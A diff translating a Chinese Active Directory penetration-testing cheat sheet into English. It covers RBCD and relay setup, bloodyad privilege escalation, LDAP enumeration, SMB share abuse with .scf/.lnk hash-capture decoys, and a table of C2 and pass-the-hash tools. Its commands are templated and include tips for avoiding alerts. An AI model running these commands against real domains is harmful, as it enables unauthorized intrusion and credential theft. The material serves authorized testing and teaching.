@@ -506,16 +508,16 @@ dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action query <dc_ip>
 dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action add --data <attacker_ip> <dc_ip>
 ```
 
-**实战要点**:
-- RBCD 前提:能修改目标机器对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`(如持有 GenericWrite/GenericAll),且有一个可控机器账户(用 `impacket-addcomputer '<domain>/<user>:<password>' -computer-name 'EVIL$' -computer-pass <pass>` 创建;普通域用户默认可建机器账户,能否成功看域的 MachineAccountQuota 配额)
-- 中继 LDAPS 需目标 DC 证书有效、未强制签名/信道绑定(默认常见可打)
-- dnstool 的 `-u` 用反斜杠格式 `domain\user`,与 impacket 系的 `domain/user` 不同
+**Practical tips**:
+- RBCD prerequisites: the ability to modify the target machine object's `msDS-AllowedToActOnBehalfOfOtherIdentity` (e.g. holding GenericWrite/GenericAll) plus a controllable machine account (create one with `impacket-addcomputer '<domain>/<user>:<password>' -computer-name 'EVIL$' -computer-pass <pass>`; ordinary domain users can create machine accounts by default, success depending on the domain's MachineAccountQuota)
+- Relaying to LDAPS requires the target DC's certificate to be valid and signing/channel binding not enforced (commonly exploitable under default configurations)
+- dnstool's `-u` takes the backslash form `domain\user`, unlike the impacket family's `domain/user`
 
-### bloodyad — AD 提权写操作框架(LDAP)
+### bloodyad — AD privilege-escalation write-operation framework (LDAP)
 
-**用途**:直接对 DC 的 LDAP 做提权类写操作:改属性、加对象、改密码、加 ACL 权限;支持密码/PHT/票据/证书认证,可透明走 SOCKS 代理。
-**安装**:`sudo apt install bloodyad`
-**使用场景**:BloodHound 找到 ACL 滥用路径(GenericAll/WriteProperty/WriteDacl 等)后,用它落地执行。
+**Purpose**: Performs privilege-escalation write operations directly against the DC's LDAP: modify attributes, add objects, reset passwords, grant ACL rights; supports password/PTH/ticket/certificate authentication and can transparently go through a SOCKS proxy.
+**Install**: `sudo apt install bloodyad`
+**When to use**: To execute in practice the ACL abuse paths (GenericAll/WriteProperty/WriteDacl etc.) that BloodHound finds.
 
 ```bash
 # 通用格式:bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> <子命令>
@@ -537,16 +539,16 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setPassword '<target
 bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setObjectAttribute '<target_dn>' userAccountControl 4194304
 ```
 
-**实战要点**:
-- `<dn>` 形如 `CN=<user>,CN=Users,DC=corp,DC=local`
-- 大量普通域用户对 OU/组对象有多余 ACL——先 BloodHound 确认路径再用,避免盲写触发告警
-- 不走 LDAPS 也支持(明文 LDAP),内网封 636 时的替代方案
+**Practical tips**:
+- `<dn>` looks like `CN=<user>,CN=Users,DC=corp,DC=local`
+- Plenty of ordinary domain users hold excess ACLs on OU/group objects — confirm the path with BloodHound first instead of writing blindly and tripping alerts
+- Works without LDAPS too (plaintext LDAP), an alternative when the intranet blocks 636
 
-### ldeep — LDAP 深度枚举工具
+### ldeep — in-depth LDAP enumeration tool
 
-**用途**:对一个域做全量 LDAP 枚举导出:用户/组/计算机/SPN/GPO/OUS/信任/AS-REP 账户等,一条命令落盘。
-**安装**:`sudo apt install ldeep`
-**使用场景**:拿到的域账户权限不足以跑 BloodHound(或需要轻量纯文本结果)时,快速摸清域内对象;也用于离线复查已缓存数据(`ldeep cache`)。
+**Purpose**: Full LDAP enumeration and export of a domain — users/groups/computers/SPNs/GPOs/OUs/trusts/AS-REP accounts and more, written to disk in a single command.
+**Install**: `sudo apt install ldeep`
+**When to use**: Quickly mapping domain objects when the domain account in hand cannot run BloodHound (or lightweight plain-text results are wanted); also for offline review of cached data (`ldeep cache`).
 
 ```bash
 # 全量枚举并落盘
@@ -568,16 +570,16 @@ ldeep ldap -d <domain> -u <user> -H <ntlm_hash> -s <dc_ip> all
 ldeep -o out.txt ldap -d <domain> -u <user> -p <password> -s <dc_ip> users
 ```
 
-**实战要点**:
-- `-o` 落盘;`all` 输出量在大域上很大,建议先 `users`/`groups` 分步
-- 加 `--security_desc`(同为顶层参数,须放在 `ldap` 子命令之前)可导出安全描述符,离线分析 ACL
-- `kerberos`/`asreproast` 输出可直接喂给后续攻击(GetUserSPNs/getNPUsers)
+**Practical tips**:
+- `-o` writes to disk; `all` produces heavy output on large domains, so start with `users`/`groups` in stages
+- Adding `--security_desc` (also a top-level parameter, so it must come before the `ldap` subcommand) exports security descriptors for offline ACL analysis
+- `kerberos`/`asreproast` output feeds directly into follow-up attacks (GetUserSPNs/getNPUsers)
 
-### smbmap — SMB 共享枚举与内容搜索
+### smbmap — SMB share enumeration and content search
 
-**用途**:枚举整个域的共享列表与权限(读/写),递归浏览/下载/上传文件,支持按扩展名批量自动下载与远程命令执行,支持 PTH。
-**安装**:`sudo apt install smbmap`
-**使用场景**:定位可写共享(投递诱饵文件)与含敏感文件的共享(备份、配置、脚本)。
+**Purpose**: Enumerates the share lists and permissions (read/write) of an entire domain, browses/downloads/uploads files recursively, supports bulk auto-download by extension and remote command execution, and supports PTH.
+**Install**: `sudo apt install smbmap`
+**When to use**: Locating writable shares (for dropping decoy files) and shares that hold sensitive files (backups, configurations, scripts).
 
 ```bash
 # 列出共享与权限(READ/WRITE 标记)
@@ -600,23 +602,23 @@ smbmap -H <ip> -u <user> -p <password> --upload /local/file.txt '<share>\\path\\
 smbmap -H <ip> -u <user> -p <password> -x 'whoami'
 ```
 
-**实战要点**:
-- 找到 WRITE 权限共享是关键:可投递 .scf/.lnk 诱饵配合 Responder 捕获 hash
-- 大域批量跑:对 CIDR 逐 IP 调用,`-d <domain>` 指定域避免本地账户歧义
-- 与 `nxc smb --shares` 相比,smbmap 能直接下钻文件内容
+**Practical tips**:
+- Finding a share with WRITE rights is the key: drop .scf/.lnk decoys there and pair them with Responder to capture hashes
+- Bulk runs on large domains: walk the CIDR IP by IP; pass `-d <domain>` to avoid local-account ambiguity
+- Compared with `nxc smb --shares`, smbmap can drill straight down into file contents
 
-## 其余工具速查
+## Remaining Tools — Quick Reference
 
-| 工具 | 一句话用途 | 安装包 | 最常用命令 |
+| Tool | One-line Purpose | Package | Most Common Command |
 |---|---|---|---|
-| azurehound | Azure 版 BloodHound 数据采集器 | azurehound | `azurehound start --tenant <tenant_id> --client-id <app_id> --client-secret <secret>` |
-| evil-winrm-py | Python 实现的 WinRM shell(支持 NTLM/PTH/证书/Kerberos) | evil-winrm-py | `evil-winrm-py -i <ip> -u <user> -p <password>` |
-| nishang | PowerShell 攻击脚本集(反弹 shell、提权、信息收集) | nishang | `ls /usr/share/nishang/`(经 `evil-winrm -s` 加载后调用 Invoke-*) |
-| passing-the-hash | pth- 前缀的哈希认证版 curl/winexe/samba 等 | passing-the-hash | `pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<ip> cmd` |
-| powershell-empire | PowerShell/Python C2 与后渗透框架 | powershell-empire | `powershell-empire server` / `powershell-empire client` |
-| powersploit | PowerShell 后渗透模块集(Inject/Mimikatz/Recon) | powersploit | `ls /usr/share/powersploit/`(目标侧 IEX 下载加载) |
-| pwsh | 跨平台 PowerShell,本地生成/测试 PS payload 与 AMSI 研究 | powershell | `pwsh -nop -enc <base64_utf16le_command>` |
-| rdesktop | 传统 RDP 客户端(已停更,仅兜底) | rdesktop | `rdesktop -u <user> -p <password> <ip>:3389` |
-| xfreerdp3 | FreeRDP3 RDP 客户端(活跃维护,支持网关/动态分辨率) | freerdp3-x11 | `xfreerdp3 /v:<ip> /u:<domain>\\<user> /p:<password> /dynamic-resolution +clipboard` |
+| azurehound | BloodHound data collector for Azure | azurehound | `azurehound start --tenant <tenant_id> --client-id <app_id> --client-secret <secret>` |
+| evil-winrm-py | WinRM shell implemented in Python (supports NTLM/PTH/certificate/Kerberos) | evil-winrm-py | `evil-winrm-py -i <ip> -u <user> -p <password>` |
+| nishang | PowerShell attack script collection (reverse shells, privilege escalation, information gathering) | nishang | `ls /usr/share/nishang/` (load via `evil-winrm -s`, then call Invoke-*) |
+| passing-the-hash | Hash-authentication builds of curl/winexe/samba etc. with the pth- prefix | passing-the-hash | `pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<ip> cmd` |
+| powershell-empire | PowerShell/Python C2 and post-exploitation framework | powershell-empire | `powershell-empire server` / `powershell-empire client` |
+| powersploit | PowerShell post-exploitation module collection (Inject/Mimikatz/Recon) | powersploit | `ls /usr/share/powersploit/` (downloaded and loaded via IEX on the target) |
+| pwsh | Cross-platform PowerShell for generating/testing PS payloads locally and for AMSI research | powershell | `pwsh -nop -enc <base64_utf16le_command>` |
+| rdesktop | Traditional RDP client (unmaintained, fallback only) | rdesktop | `rdesktop -u <user> -p <password> <ip>:3389` |
+| xfreerdp3 | FreeRDP3 RDP client (actively maintained, supports gateway/dynamic resolution) | freerdp3-x11 | `xfreerdp3 /v:<ip> /u:<domain>\\<user> /p:<password> /dynamic-resolution +clipboard` |
 
-> 本文件仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景。
+> This file is for penetration testing with written authorization, CTF competitions, and security education scenarios only.
